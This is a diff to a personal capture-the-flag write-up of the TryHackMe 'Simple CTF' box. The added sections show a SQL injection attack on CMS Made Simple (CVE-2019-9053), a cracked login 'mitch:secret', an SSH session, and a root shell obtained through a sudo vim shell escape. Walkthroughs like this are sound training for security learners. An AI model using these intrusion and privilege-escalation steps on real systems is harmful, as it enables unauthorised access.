@@ -1,10 +1,10 @@
 ---
 date: 2024-10-16
 title: Simple CTF THM Write-Up
-machine_ip: 10.10.54.127
+machine_ip: 10.10.54.127 (IP changes as box was reset multiple times... UNSTABLE)
 os: Linux
 difficulty: Easy
-my_rating: 
+my_rating: 2
 tags:
   - Linux
   - PrivEsc
@@ -12,6 +12,15 @@ tags:
   - nmap
   - feroxbuster
   - php
+  - vim
+  - GTFOBins
+  - LOLBINS
+  - sudo
+  - SQLInjection
+  - passwordattacks
+  - Apache
+  - CMS
+  - ssh
 references: "[[📚CTF Box Writeups]]"
 ---
 
@@ -164,8 +173,8 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 http://10.10.54.127 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.54.127], Title[Apache2 Ubuntu Default Page: It works]  
 ```
 
-- We find an apache webserver `Apache 2.4.18` and many directories open to the public
-- The website is running `CMS Made Simple version 2.2.8` after navigating to `http://10.10.54.127/simple`
+- We find an #Apache  webserver `Apache 2.4.18` and many directories open to the public
+- The website is running #CMS `CMS Made Simple version 2.2.8` after navigating to `http://10.10.54.127/simple`
 - Also, we find and admin login portal at `http://10.10.54.127/simple/admin/login.php`
 - We find a post about a new module installed by someone named `mitch`, may be our user
 
@@ -174,9 +183,41 @@ http://10.10.54.127 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[U
 # Foothold
 
 - gain shell via exploit
-- We find an [exploit](https://www.exploit-db.com/exploits/46635) for CMS < 2.2.10 that performs unauthenticated SQL Injections to crack the login credentials #CVE-2019-9053
+- We find an [exploit](https://www.exploit-db.com/exploits/46635) for CMS < 2.2.10 that performs unauthenticated SQL Injections to crack the login credentials #CVE-2019-9053 (Brute forces the salt, username, email, and password)
 	- Running this exploit manually, as a python script is taking a while... standby
-	- 
+	- Machine required a reset, so the IP changed
+	- During my script running, I get a Traceback error saying the server has closed connection. When I ping the box, I get nothing. I may be breaking the box but the script stopped at `1dac0d92e9fa62` in an attempt to crack the salt. 
+	- Reset the box a second time, we got the salt for the password `1dac0d92e9fa6bb2`. Then the server closed again...
+	- Happened again. This room/box is unstable...
+	- Getting the password for this step online since it keeps breaking and proceeding solo after that
+		- Appears I was correct in the vulnerability and exploit to use
+		- `secret` is the password
+
+- `mitch:secret` logs us into the admin web portal
+- Using the #SSH port we found in the nmap scan, we can log in and get a shell
+```
+┌──(root㉿kali)-[~/Downloads]
+└─# ssh mitch@10.10.218.42 -p 2222
+mitch@10.10.218.42's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 packages can be updated.
+0 updates are security updates.
+
+Last login: Thu Oct 17 03:19:20 2024 from 10.2.1.119
+$ whoami
+mitch
+```
+
+- User flag - mitch
+```
+$ cat user.txt
+G00d j0b, keep up!
+```
 
 ---
 
@@ -184,3 +225,23 @@ http://10.10.54.127 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[U
 
 [[Privilege Escalation]], [[🦊TCM Security/PrivEsc_Windows/1_Initial_Enumeration]]
 - escalate to root
+- `mitch` user can run `vim` as `sudo`! We can try to use binaries to get a root shell
+```
+$ sudo -l
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+```
+
+- Get a root shell
+```
+$ sudo vim -c ':!/bin/sh'
+
+# whoami
+root
+```
+
+- Root flag
+```
+# cat root.txt
+W3ll d0n3. You made it!
+```
